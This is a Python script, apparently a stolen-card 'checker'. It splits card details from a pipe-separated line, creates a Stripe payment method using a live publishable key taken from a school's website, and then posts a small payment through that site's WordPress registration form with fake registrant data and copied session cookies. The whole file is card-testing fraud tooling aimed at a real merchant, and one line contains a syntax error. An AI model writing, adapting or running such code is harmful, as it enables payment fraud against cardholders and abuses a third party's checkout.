import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F1563621329%3B+stripe-js-v3%2F1563621329%3B+card-element&referrer=https%3A%2F%2Finstituteofknowledge.com&time_on_page=200532&key=pk_live_51Cr8sVJiGvLYuMvJl9Xa1gUcUUASgQ9mMQQnMhh2EPPLP8ylj37SAOWkwTHyFoql32OL8okEKA6rK9j7fpQELkfx00Hn9xTgsM'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_lscache_vary': '2f206b3adf54236a42864c1c95b7a979',
	    '_ga': 'GA1.1.178300803.1745264198',
	    '__stripe_mid': 'e2ace93b-23e1-49b1-a320-5ece60e907824943c9',
	    '__stripe_sid': '007e98eb-e4f7-4d4a-b22c-b4dbfec7b4e99e959b',
	    '_ga_0G99XHMCNY': 'GS1.1.1745298044.2.1.1745298251.0.0.0',
	}
	
	headers = {
	    'authority': 'instituteofknowledge.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_lscache_vary=2f206b3adf54236a42864c1c95b7a979; _ga=GA1.1.178300803.1745264198; __stripe_mid=e2ace93b-23e1-49b1-a320-5ece60e907824943c9; __stripe_sid=007e98eb-e4f7-4d4a-b22c-b4dbfec7b4e99e959b; _ga_0G99XHMCNY=GS1.1.1745298044.2.1.1745298251.0.0.0',
	    'origin': 'https://instituteofknowledge.com',
	    'referer': 'https://instituteofknowledge.com/saturday-school-registration/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1745298252163',
	}
	
	data = 'data=__fluent_form_embded_post_id%3D24%26_fluentform_3_fluentformnonce%3D29ae72e295%26_wp_http_referer%3D%252Fsaturday-school-registration%252F%26dropdown%3D875%26input_text%3DJimmie%26dropdown_1%3DTransitional%2520Kindergarten%2520(TK)%26datetime%3D22%252F04%252F2025%26description%3D%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNew%2520York%26address_1%255Bzip%255D%3D10080%26names%255Bfirst_name%255D%3DRodam%26names%255Blast_name%255D%3DUser%26input_text_6%3DBro%26phone%3D%252B14382999869%26email%3Drodamuser08%2540gmail.com%26names_1%255Bfirst_name%255D%3DRodam%26names_1%255Blast_name%255D%3DUser%26input_text_7%3DBro%26phone_1%3D%252B14382999869%26names_2%255Bfirst_name%255D%3DRobart%26names_2%255Blast_name%255D%3DKaba%26datetime_6%3D22%252F04%252F2025%26input_radio%3DPay%2520Entire%2520Amount%26custom-payment-amount%3D0.50%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=3'
	
	r2 = requests.post(
	    'https://instituteofknowledge.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
